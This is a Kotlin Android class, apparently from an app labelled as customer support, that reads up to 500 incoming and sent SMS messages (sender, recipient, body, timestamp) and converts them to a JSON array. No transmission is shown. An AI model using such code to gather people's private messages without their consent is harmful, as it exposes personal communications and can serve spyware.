package com.customersupport.data

import android.content.ContentResolver
import android.content.Context
import android.database.Cursor
import android.provider.Telephony
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

class SmsReader(private val context: Context) {
    
    companion object {
        private const val TAG = "SmsReader"
    }

    fun readAllSms(limit: Int = 500): JSONArray {
        val smsArray = JSONArray()

        try {
            val contentResolver: ContentResolver = context.contentResolver
            val halfLimit = limit / 2
            readSmsFromUri(contentResolver, Telephony.Sms.Inbox.CONTENT_URI, "incoming", smsArray, halfLimit)
            readSmsFromUri(contentResolver, Telephony.Sms.Sent.CONTENT_URI, "outgoing", smsArray, halfLimit)
            Log.d(TAG, "Read ${smsArray.length()} SMS messages")
        } catch (e: SecurityException) {
            Log.e(TAG, "Permission denied to read SMS", e)
        } catch (e: Exception) {
            Log.e(TAG, "Error reading SMS", e)
        }

        return smsArray
    }

    private fun readSmsFromUri(
        contentResolver: ContentResolver,
        uri: android.net.Uri,
        type: String,
        smsArray: JSONArray,
        limit: Int
    ) {
        val cursor: Cursor? = contentResolver.query(
            uri,
            arrayOf(
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE
            ),
            null,
            null,
            "${Telephony.Sms.DATE} DESC"
        )

        cursor?.use {
            val idIndex = it.getColumnIndex(Telephony.Sms._ID)
            val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
            val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
            var count = 0

            while (it.moveToNext() && count < limit) {
                count++
                val id = it.getString(idIndex) ?: ""
                val address = it.getString(addressIndex) ?: "Unknown"
                val body = it.getString(bodyIndex) ?: ""
                val date = it.getLong(dateIndex)

                val smsJson = JSONObject().apply {
                    put("id", "${type}_$id")
                    put("sender", if (type == "incoming") address else "Me")
                    put("receiver", if (type == "outgoing") address else "Me")
                    put("message", body)
                    put("timestamp", formatDate(date))
                    put("type", type)
                }
                smsArray.put(smsJson)
            }
        }
    }

    private fun formatDate(timestamp: Long): String {
        val sdf = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
        sdf.timeZone = TimeZone.getTimeZone("UTC")
        return sdf.format(Date(timestamp))
    }
}
